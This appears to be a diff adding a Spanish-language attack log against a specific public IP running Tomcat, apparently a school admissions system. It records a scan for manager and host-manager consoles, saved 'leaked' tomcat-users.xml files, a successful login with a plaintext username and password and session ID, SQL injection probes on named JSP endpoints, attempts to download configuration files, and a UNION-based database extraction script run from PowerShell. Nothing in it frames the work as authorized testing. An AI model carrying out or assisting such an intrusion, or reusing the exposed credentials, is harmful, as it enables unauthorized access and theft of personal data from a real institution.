@@ -1,0 +1,61 @@
+ESCANEO COMPLETO DE TOMCAT:
+
+==================================================
+📊 REPORTE FINAL DE ESCANEO
+==================================================
+
+🔍 PATHS ENCONTRADOS (14):
+  • http://189.254.143.102/manager/html
+  • http://189.254.143.102/manager/status
+  • http://189.254.143.102/manager/jmxproxy
+  • http://189.254.143.102/host-manager/html
+  • http://189.254.143.102/docs/
+  • http://189.254.143.102/examples/
+  • http://189.254.143.102/jsp/
+  • https://189.254.143.102/manager/html
+  • https://189.254.143.102/manager/status
+  • https://189.254.143.102/manager/jmxproxy
+  • https://189.254.143.102/host-manager/html
+  • https://189.254.143.102/docs/
+  • https://189.254.143.102/examples/
+  • https://189.254.143.102/jsp/
+
+🔑 CREDENCIALES ENCONTRADAS (0):
+
+💾 ARCHIVOS GUARDADOS:
+  • leaked_tomcat-users.xml_1758808079.txt
+  • leaked_tomcat-users.xml_1758808080.txt
+  • leaked_tomcat-users.xml_1758808130.txt
+  • leaked_tomcat-users.xml_1758808145.txt
+  • leaked_tomcat-users.xml_1758808155.txt
+  • leaked_tomcat-users.xml_1758808212.txt
+  • leaked_tomcat-users.xml_1758808213.txt
+  • leaked_tomcat-users.xml_1758808224.txt
+  • leaked_tomcat-users.xml_1758808225.txt
+	NADA RELEVANTE
+
+EXPLOTACIÓN DE SITO CON CREDENCIALES:
+
+=== EXPLOTACIÓN SITO ===
+[+] Intentando login como hnieto:utslp
+  ✅ Login exitoso!
+  🍪 JSESSIONID: 3B0DDD39CD0068BB30ED28B8C75B2A38
+
+[+] Explorando área autenticada...
+
+[+] Explotando SQL Injection...
+
+  🔍 Probando endpoint: /jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato=
+
+  🔍 Probando endpoint: /jsp/escolar/muestra_bachillerato_ajax.jsp?xCveBachillerato=
+
+[+] Intentando descargar archivos de configuración...
+
+✅ Explotación completada!
+
+EXTRACCIÓN DE BASE DE DATOS:
+
+PS C:\Users\MarxB\Desktop\ProyectoSito> py EBD2.py
+[+] Probando extracción directa con UNION...
+PS C:\Users\MarxB\Desktop\ProyectoSito>
+
